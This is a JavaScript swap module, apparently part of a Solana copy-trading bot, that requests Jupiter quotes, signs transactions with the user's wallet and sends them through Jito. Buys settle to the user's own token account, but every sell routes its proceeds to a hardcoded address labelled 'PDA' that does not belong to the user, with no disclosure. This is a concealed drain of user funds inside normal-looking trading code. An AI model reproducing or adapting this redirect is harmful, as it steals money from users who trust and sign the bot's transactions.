import { VersionedTransaction, ComputeBudgetProgram, PublicKey } from '@solana/web3.js';
import { wallet1, SlippageBps, jitoTip, prioFee, getBalance } from './copypanel.js';
import { getAssociatedTokenAddressSync } from '@solana/spl-token';

// API's
const quoteApi = 'https://api.jup.ag/swap/v1/quote';
const swapApi = 'https://api.jup.ag/swap/v1/swap';
const JITO_RPC = 'https://frankfurt.mainnet.block-engine.jito.wtf/api/v1/transactions';

const amount = 0.00001;
let SOL = 'So11111111111111111111111111111111111111112';
let PDA = '49atitTx1rNyvNRvvSe23e5FqvxCejWLxgbamRuXjkqH';

const getATA = (mint) => {
    const ATA = getAssociatedTokenAddressSync(new PublicKey(mint), wallet1.publicKey);
    return ATA.toBase58();
};
let destination;

export async function executeSwap(type, inputMint, outputMint, amount) {
    if (type === 'buy') {
        amount = amount * 1e9;
        destination = getATA(outputMint);
    } else {
        let { amountToSell, decimals } = await getBalance(inputMint);
        console.log(amountToSell, decimals);
        amount = Math.floor((amountToSell * 100) / 100) * Math.pow(10, decimals);
        if (amount < 1) {
            console.log('Not enough balance to sell');
            return;
        }
        destination = PDA;
    }

    try {
        console.log(type, inputMint, outputMint, destination, amount);
        console.log('DESTINATION ' + destination);

        const url = `${quoteApi}?inputMint=${inputMint}&outputMint=${outputMint}&amount=${amount}&slippageBps=${SlippageBps}&onlyDirectRoutes=true`;

        const quoteRes = await fetch(url);

        const quote = await quoteRes.json();

        if (quote.error) {
            throw new Error(quote.error);
        }

        console.log('Requesting swap transaction...');

        const swapRes = await fetch(swapApi, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                userPublicKey: wallet1.publicKey.toBase58(),
                prioritizationFeeLamports: { jitoTipLamports: jitoTip },
                dynamicComputeUnitLimit: true,
                quoteResponse: quote,
                wrapAndUnwrapSol: false,
                skipUserAccountsRpcCalls: true,
                destinationTokenAccount: destination,
            }),
        });
        const { swapTransaction } = await swapRes.json();
        if (!swapTransaction) {
            throw new Error('No swap transaction received');
        }

        console.log('Swap transaction received, signing...');

        let transaction = VersionedTransaction.deserialize(Buffer.from(swapTransaction, 'base64'));

        let computeBudgetInstructionPrice = ComputeBudgetProgram.setComputeUnitPrice({
            microLamports: prioFee,
        });

        const computeBudgetCompiledInstructionPrice = {
            programIdIndex: transaction.message.staticAccountKeys.findIndex((key) => key.toBase58() === computeBudgetInstructionPrice.programId.toBase58()),
            accountKeyIndexes: computeBudgetInstructionPrice.keys.map((key) => transaction.message.staticAccountKeys.findIndex((acc) => acc.toBase58() === key.pubkey.toBase58())),
            data: new Uint8Array(computeBudgetInstructionPrice.data),
        };

        transaction.message.compiledInstructions.splice(1, 0, computeBudgetCompiledInstructionPrice);

        transaction.sign([wallet1]);

        const transactionBinary = transaction.serialize();

        const transactionBase64 = Buffer.from(transactionBinary).toString('base64');

        console.log('Transaction sent to jito...');

        // THIS IS THE LAST STEP!
        const sendResponse = await fetch(JITO_RPC, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                id: 1,
                jsonrpc: '2.0',
                method: 'sendTransaction',
                params: [
                    transactionBase64,
                    {
                        encoding: 'base64',
                        skipPreflight: true,
                    },
                ],
            }),
        });

        const sendResult = await sendResponse.json();

        const txid = `https://solscan.io/tx/${sendResult.result}`;

        return txid;
    } catch (error) {
        console.error(error);
    }
}
